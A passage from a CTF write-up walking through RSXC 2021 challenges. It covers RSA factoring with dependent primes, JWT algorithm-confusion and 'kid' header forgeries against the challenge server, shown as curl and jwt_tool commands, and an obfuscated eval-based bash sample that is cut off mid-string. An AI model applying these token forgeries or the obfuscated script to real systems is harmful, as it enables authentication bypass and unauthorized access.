<blockquote><p>Sometimes you need to look up to get the answer you need.
<a href="http://rsxc.no:20010/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20010</a></p></blockquote>
<h3 id="solution-9"><a href="#solution-9">Solution</a></h3>
<p>Navigating to the page we see an input field telling us to “lookup”. After fuzzing for quite some time, I guessed that it could be something about DNS lookup as the title was hinting for it. However, running <code>dig</code>, <code>nslookup</code> and so on didn’t give me any useful results. After a while on a lucky guess I curl’ed the url along with the headers thinking that there might be some useful request headers I might have overlooked, and there it is. The flag was included as a header:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -I rsxc.no:20010/
HTTP/1.1 <span class="token number">200</span> OK
Date: Thu, <span class="token number">16</span> Dec <span class="token number">2021</span> <span class="token number">16</span>:20:12 GMT
Server: Apache/2.4.51 <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
X-Powered-By: PHP/7.4.26
Flag: RSXC<span class="token punctuation">&#123;</span>Sometimes_headers_can_tell_you_something_useful<span class="token punctuation">&#125;</span>
Content-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8</code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Sometimes_headers_can_tell_you_something_useful}</code></p>
<h2 id="day-11-the-not-so-random-prime"><a href="#day-11-the-not-so-random-prime">[DAY 11] The not so random prime</a></h2>
<h3 id="challenge-10"><a href="#challenge-10">Challenge</a></h3>
<blockquote><p>We intercepted some traffic from a malicious actor. They seemed to be using a not so secure implementation of RSA, could you help us figure out how they did it?
<a href="https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip" rel="noopener" class="text-link" target="_blank">https://rsxc.no/af6c1a2345b4de89831605d6c9cd9307b6b54df0bd6bd8c506317277119457e8/11-challenge.zip</a></p></blockquote>
<h3 id="solution-10"><a href="#solution-10">Solution</a></h3>
<p>We are given a rsa encryption script and it’s output. Observing the code, we can first see that there’s something strange with the prime generation. The problem is that it doesn’t generate two independent random primes as an RSA encryption scheme should. Instead it generates an independent random prime number p (with 1023 or 1024 bits), then a random prime q obtained by the line: <code>q = nextprime(p * p)</code> (meaning that q is generated with dependent on p).</p>
<p>Knowing this, we know that N is approximately <code>p^3</code>, and taking the cuberoot of N, we can get the approximate for p. Knowing the approximate p or the exact p itself we can easily find <code>q</code> and then decrypt everything. A quick python script can be seen below:</p>
<pre class="language-python"><!-- HTML_TAG_START --><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA <span class="token comment">#pycryptodome</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP
<span class="token keyword">from</span> sympy <span class="token keyword">import</span> randprime<span class="token punctuation">,</span> nextprime<span class="token punctuation">,</span> invert
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> mpz

<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rsa.out"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        n<span class="token punctuation">,</span>_<span class="token punctuation">,</span>ct <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    ct <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ct<span class="token punctuation">)</span>
    n <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    e <span class="token operator">=</span> <span class="token number">65537</span>
    estimate <span class="token operator">=</span> mpz<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    prime <span class="token operator">=</span> estimate
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"r: "</span><span class="token punctuation">,</span>estimate<span class="token punctuation">)</span>
    p <span class="token operator">=</span> mpz<span class="token punctuation">(</span>prime<span class="token punctuation">)</span>
    q <span class="token operator">=</span> mpz<span class="token punctuation">(</span>n <span class="token operator">//</span> p<span class="token punctuation">)</span>
    <span class="token keyword">assert</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q <span class="token operator">==</span> n<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p: "</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q: "</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    rsa <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span>
decode<span class="token punctuation">(</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Good_Job!I_see_you_know_how_to_do_some_math_and_how_rsa_works}</code></p>
<h2 id="day-12-twelve-seconds-of-encoding"><a href="#day-12-twelve-seconds-of-encoding">[DAY 12] Twelve seconds of encoding</a></h2>
<h3 id="challenge-11"><a href="#challenge-11">Challenge</a></h3>
<blockquote><p>For this challenge you need to do some encoding, but remember, you need to do it quickly, before the time runs out.
rsxc.no:20012</p></blockquote>
<h3 id="solution-11"><a href="#solution-11">Solution</a></h3>
<p>We are given an address to connect to, connecting to it prompts us to solve 100 different encoding and string manipulation tasks in under 12 seconds. As this is probably not possible to do manually by hand, I opted to solve this using python and pwntools. A quick and dirty code for the solution can be seen below:</p>
<pre class="language-python"><!-- HTML_TAG_START --><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"rsxc.no"</span><span class="token punctuation">,</span> <span class="token number">20012</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    q <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>
    q<span class="token punctuation">,</span>a <span class="token operator">=</span> q<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> q<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">if</span> <span class="token string">"reverse"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">elif</span> <span class="token string">"hex"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"lower"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token string">"base64"</span> <span class="token keyword">in</span> q<span class="token punctuation">:</span>
        res <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> res<span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Seems_like_you_have_a_knack_for_encoding_and_talking_to_servers!}</code></p>
<h2 id="day-13-new-technology-is-hard"><a href="#day-13-new-technology-is-hard">[DAY 13] New technology is hard</a></h2>
<h3 id="challenge-12"><a href="#challenge-12">Challenge</a></h3>
<blockquote><p>When starting with new languages and frameworks, it is easy to get confused, and do things you shouldn’t.
<a href="http://rsxc.no:20013/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20013</a></p></blockquote>
<h3 id="solution-12"><a href="#solution-12">Solution</a></h3>
<p>Navigating to the site, we are greeted with a basic beginner todo list example in React. However just as the description says, the user seemed to have published the project in development mode and not in production. This means that the source code of the page could be seen. Looking through the source code, we see a base64 string at the file <code>Todos.js</code>.</p>
<pre class="language-jsx"><!-- HTML_TAG_START --><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Todos</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> b64 <span class="token operator">=</span> <span class="token string">'UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0='</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Hide this somewhere, and not just rely on base64: </span><span class="token punctuation">&#123;</span>b64<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>Decrypting it gives us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token assign-left variable">UlNYQ3tpdF9taWdodF9iZV90aGVyZV9ldmVuX2lmX3lvdV9kb24ndF9pbmNsdWRlX2l0IX0</span><span class="token operator">=</span> <span class="token operator">|</span> base64 -d
RSXC<span class="token punctuation">&#123;</span>it_might_be_there_even_if_you_don't_include_it<span class="token operator">!</span><span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{it_might_be_there_even_if_you_don&#39;t_include_it!}</code></p>
<h2 id="day-14-jwt"><a href="#day-14-jwt">[DAY 14] JWT</a></h2>
<h3 id="challenge-13"><a href="#challenge-13">Challenge</a></h3>
<blockquote><p>Have you heard about the secure information sharing standard JWT? It can sometimes be a little confusing, but I think we got it all figured out.
<a href="http://rsxc.no:20014/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20014</a></p></blockquote>
<h3 id="solution-13"><a href="#solution-13">Solution</a></h3>
<p>Looking at the title of the challenge I can guess that this challenge is about a wrong implementation of JSON Web Tokens, an industry standard RFC 7519 method for representing claims securely between two parties. Following the guides from <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens" rel="noopener" class="text-link" target="_blank">hacktricks</a> of different ways a JWT can be exploited. I begin to test the exploit of changing the algorithm RS256(asymmetric) to HS256(symmetric), since we had public key given to us. If the backend is implemented without checking for a specific algorithm, the back end code will then use the public key to both sign and verify the signature, meaning that we can easily manipulate and sign our own token. This was done using the site jwt.io:
<img src="https://i.imgur.com/Qjl9Ol4.png" alt="jwt output"></p>
<p>Navigating to the page with our new and tampered JWT cookie gives us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP14</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20014/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20014/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s <span class="token string">'http://rsxc.no:20014/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP14<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.gERmL-_S0FkZDAbIE6zrYSIP2MKc3Mrh5jxOWkM8Gyw"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>You_have_to_remember_to_limit_what_algorithms_are_allowed<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{You_have_to_remember_to_limit_what_algorithms_are_allowed}</code></p>
<h2 id="day-15-jwt-2"><a href="#day-15-jwt-2">[DAY 15] JWT 2</a></h2>
<h3 id="challenge-14"><a href="#challenge-14">Challenge</a></h3>
<blockquote><p>I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
<a href="http://rsxc.no:20015/" rel="noopener" class="text-link" target="_blank">http://rsxc.no:20015</a></p></blockquote>
<h3 id="solution-14"><a href="#solution-14">Solution</a></h3>
<p>This challenge seemed to be the same as day 15 but with just <code>kid</code>-issues added. <code>kid</code> is an optional header claim which holds a key identifier, useful when we have multiple keys to sign the tokens and need to look up the right one to verify the signature. However, we can from this knowledge, utilize it as a type of path traversal giving either an error if the file exists or not. If the <code>kid</code> file path check is used within php functions such as <code>include</code> or <code>file_get_content</code> one could also inject the data in, reading the source. After much trial and error using the well known python <a href="https://github.com/ticarpi/jwt_tool" rel="noopener" class="text-link" target="_blank">jwt_tool</a> for tampering with the token, we find that setting the <code>kid</code> value to a php file from the website will print out the data in plaintext for us. Knowing this, I set the <code>kid</code> value to <code>portal.php</code> (the page responsible for checking and authing the JWT token). Using that tampered token on navigation did give us the flag:</p>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8 -I -hc kid -hv <span class="token string">"portal.php"</span> -S hs256 -p <span class="token string">""</span> -pc username -pv admin -pk <span class="token punctuation">..</span>/jwtRS256.key.pub

        <span class="token punctuation"></span>   <span class="token punctuation"></span>        <span class="token punctuation"></span>         <span class="token punctuation"></span>          <span class="token punctuation"></span>                    <span class="token punctuation"></span>
   <span class="token punctuation"></span>__   <span class="token operator">|</span>   <span class="token operator">|</span>  <span class="token punctuation"></span>     <span class="token operator">|</span><span class="token punctuation"></span>__    __<span class="token operator">|</span> <span class="token punctuation"></span>__    __<span class="token operator">|</span>                    <span class="token operator">|</span>
         <span class="token operator">|</span>   <span class="token operator">|</span>   <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>       <span class="token punctuation"></span>         <span class="token punctuation"></span>     <span class="token operator">|</span>
         <span class="token operator">|</span>        <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>    __  <span class="token punctuation"></span>     __  <span class="token punctuation"></span>    <span class="token operator">|</span>
  <span class="token punctuation"></span>      <span class="token operator">|</span>      _     <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
   <span class="token operator">|</span>     <span class="token operator">|</span>     / <span class="token punctuation"></span>    <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>     <span class="token operator">|</span>   <span class="token operator">|</span>
<span class="token punctuation"></span>        <span class="token operator">|</span>    /   <span class="token punctuation"></span>   <span class="token operator">|</span>      <span class="token operator">|</span>          <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span><span class="token punctuation"></span>        <span class="token operator">|</span>   <span class="token operator">|</span>
 <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__/     <span class="token punctuation"></span>__<span class="token operator">|</span>   <span class="token punctuation"></span>__<span class="token operator">|</span>      <span class="token punctuation"></span>__<span class="token operator">|</span> <span class="token punctuation"></span>______/  <span class="token punctuation"></span>______/ <span class="token punctuation"></span>__<span class="token operator">|</span>
 Version <span class="token number">2.2</span>.4                <span class="token punctuation"></span>______<span class="token operator">|</span>             @ticarpi

Original JWT:

jwttool_b369f60acd84aec98b34740db6882c06 - Tampered token - HMAC Signing:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ</code><!-- HTML_TAG_END --></pre>
<pre class="language-shell"><!-- HTML_TAG_START --><code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token assign-left variable">TEMP15</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/'</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"PHPSESSID=.*?;"</span><span class="token variable">)</span></span> <span class="token comment"># Get PHPSESSIONID</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> <span class="token string">'http://rsxc.no:20015/'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span>"</span> --data-raw <span class="token string">'username=test&amp;password=test'</span> <span class="token comment"># LOGIN</span>
juki@izone:~/Desktop/ctf/rsxc2021/jwt_tool$ <span class="token function">curl</span> -s -i <span class="token string">'http://rsxc.no:20015/portal.php'</span> -H <span class="token string">"Cookie: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> -n $TEMP15<span class="token variable">)</span></span> jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InBvcnRhbC5waHAifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.PbNF4szD3H-puzObv0p4MgXUudQSmvIuxmwjfhQYguQ"</span> <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span> <span class="token comment"># SET TAMPERED JWT AND GET FLAG</span>
RSXC<span class="token punctuation">&#123;</span>Don't_let_others_decide_where_your_keys_are_located<span class="token punctuation">&#125;</span></code><!-- HTML_TAG_END --></pre>
<p>The flag is: <code>RSXC{Don&#39;t_let_others_decide_where_your_keys_are_located}</code></p>
<h2 id="day-16-a-scary-command"><a href="#day-16-a-scary-command">[DAY 16] A scary command</a></h2>
<h3 id="challenge-15"><a href="#challenge-15">Challenge</a></h3>
<blockquote><p>Sometimes while monitoring networks and machines, or doing incident response, we find some obfuscated commands. We didn’t have time to deobfuscate this, and it is not recommended to just run it. Could you help us with it?
<a href="https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh" rel="noopener" class="text-link" target="_blank">https://rsxc.no/dfb61488866658d31e3e7ccd2287caf233108a7eb917da6aefde3792d0fd79d2/16-challenge.sh</a></p></blockquote>
<h3 id="solution-15"><a href="#solution-15">Solution</a></h3>
<p>Downloading the shell file, we see some obfuscated bash scripting. Running this blindly is probably not a good idea as just as the title says, it might be a scary command. What I began to do in order to reverse this obfuscation is to comment out the <code>eval</code> commands and swapping it with echo, seen below. Running this following script outputs some further steps to do:</p>
<pre class="language-bash"><!-- HTML_TAG_START --><code class="language-bash"><span class="token comment"># 16-challenge.sh</span>
<span class="token assign-left variable">gH4</span><span class="token operator">=</span><span class="token string">"Ed"</span><span class="token punctuation">;</span><span class="token assign-left variable">kM0</span><span class="token operator">=</span><span class="token string">"xSz"</span><span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token string">"ch"</span><span class="token punctuation">;</span><span class="token assign-left variable">L</span><span class="token operator">=</span><span class="token string">"4"</span><span class="token punctuation">;</span><span class="token assign-left variable">rQW</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token assign-left variable">fE1</span><span class="token operator">=</span><span class="token string">"lQ"</span><span class="token punctuation">;</span><span class="token assign-left variable">s</span><span class="token operator">=</span><span class="token string">" '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
